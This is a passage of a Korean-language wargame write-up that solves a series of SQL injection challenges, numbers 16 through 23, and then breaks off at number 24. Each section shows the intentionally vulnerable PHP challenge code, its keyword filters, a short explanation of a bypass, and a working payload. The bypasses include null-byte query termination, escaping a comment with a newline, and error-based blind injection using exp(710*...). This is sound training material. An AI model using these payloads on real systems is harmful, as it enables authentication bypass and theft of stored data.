php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line">  <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>] = <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]));</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_zombie_assassin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;zombie_assassin&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>addslashes 함수는 특수문자의 앞에 (backslash) 를 삽입하여 SQL 문에서 구문으로서의 쿼트 삽입을 방지하는데 strrev 함수는 백슬래시를 고려하지 않습니다.<br>따라서 id 파라미터에 더블쿼트 등의 addslashes 의 영향을 받는 문자(싱글쿼트를 제외한)를 입력하여 주면 id 파라미터의 쿼트가 백슬래시의 영향을 받아 일반문자열로 취급됩니다. 이후 pw 파라미터에서 항상 참이 나오도록 하고 뒷부분을 주석으로 만들어주면 해결됩니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=&quot;&amp;pw=#1||</span><br></pre></td></tr></table></figure><h3 id="17-succubus"><a href="#17-succubus" class="headerlink" title="17. succubus"></a>17. succubus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_succubus where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;succubus&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일한 방법으로 해결할 수 있습니다.<br>다만 id 파라미터에 (backslash) 를 직접적으로 삽입해 줍니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=\&amp;pw=||1#</span><br></pre></td></tr></table></figure><h3 id="18-nightmare"><a href="#18-nightmare" class="headerlink" title="18. nightmare"></a>18. nightmare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)|#|-/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_nightmare where pw=(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;) and id!=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;nightmare&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>글자수가 극단적으로 제한되어 있습니다.<br>주석처리에 사용되는 -, # 가 필터링 되어 있으므로<br>;%00를 통해 쿼리문을 종결시켜야 합니다.<br>pw 와의 비교문에서는 다양한 연산자를 통해 참으로 만들어 줄 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : pw=&#x27;)=0;%00</span><br><span class="line">Solution2 : pw=&#x27;)&amp;1;%00</span><br><span class="line">Solution3 : pw=&#x27;)*1;%00</span><br><span class="line">Solution4 : pw=&#x27;)/1;%00</span><br></pre></td></tr></table></figure><h3 id="19-xavis"><a href="#19-xavis" class="headerlink" title="19. xavis"></a>19. xavis</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/regex|like/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;xavis&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>like 연산자는 필터링 되었지만, instr 함수를 사용하면 패스워드를 브루트포싱 할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||id=&quot;admin&quot; and instr(pw,&quot;BRUTE_HERE&quot;)#</span><br></pre></td></tr></table></figure><h3 id="20-dragon"><a href="#20-dragon" class="headerlink" title="20. dragon"></a>20. dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;dragon&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>id 조건식 뒷 부분이 주석처리 되어 있는데 개행문자를 삽입하면 주석에서 탈출할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=%0a &amp;&amp; 0||id=&quot;admin&quot;#</span><br></pre></td></tr></table></figure><h3 id="21-iron-golem"><a href="#21-iron-golem" class="headerlink" title="21. iron_golem"></a>21. iron_golem</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_iron_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$db</span>)) <span class="keyword">exit</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$db</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_iron_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;iron_golem&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>오류코드을 출력해 주는 Error based 문제입니다. updatexml 을 시도해 보았지만 pw 컬럼의 값이 utf32 자료형으로 되어있어 바로 확인 할 수는 없었습니다.<br>하지만 if 을 이용해 런타임에서 오류를 발생시키는 3e200 * 3e200 연산식을 삽입하면 blind injection 이 가능합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||if(ord(mid(pw,1,1))&gt;50000,1,3e200*3e200)#</span><br></pre></td></tr></table></figure><h3 id="22-dark-eyes"><a href="#22-dark-eyes" class="headerlink" title="22. dark_eyes"></a>22. dark_eyes</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/col|if|case|when|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_dark_eyes where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$db</span>)) <span class="keyword">exit</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_dark_eyes where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;dark_eyes&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 비슷하지만, if, case, when 등이 필터링 되므로 if문이 아닌 다른 방법을 사용해야만 합니다. exp 함수에 710 이상의 인자를 주면 double value out of range 오류가 발생한다는 것을 이용하여 exp(710*(조건식)) 의 형태로 Error based blind injection을 시도할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||exp(710*(ord(substr((pw),1,1))&gt;=40))#</span><br></pre></td></tr></table></figure><h3 id="23-hell-fire"><a href="#23-hell-fire" class="headerlink" title="23. hell_fire"></a>23. hell_fire</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_hell_fire where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$rows</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">while</span>((<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[email] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[email]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select email from prob_hell_fire where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;hell_fire&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일한 방식으로 해결할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : order=exp(710*(ord(substr((email),1,1))&gt;=5000))</span><br></pre></td></tr></table></figure><h3 id="24-evil-wizard"><a href="#24-evil-wizard" class="headerlink" title="24. evil_wizard"></a>24. evil_wizard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|proc|union|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_evil_wizard where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>; <span class="comment">// same with hell_fire? really?</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;table 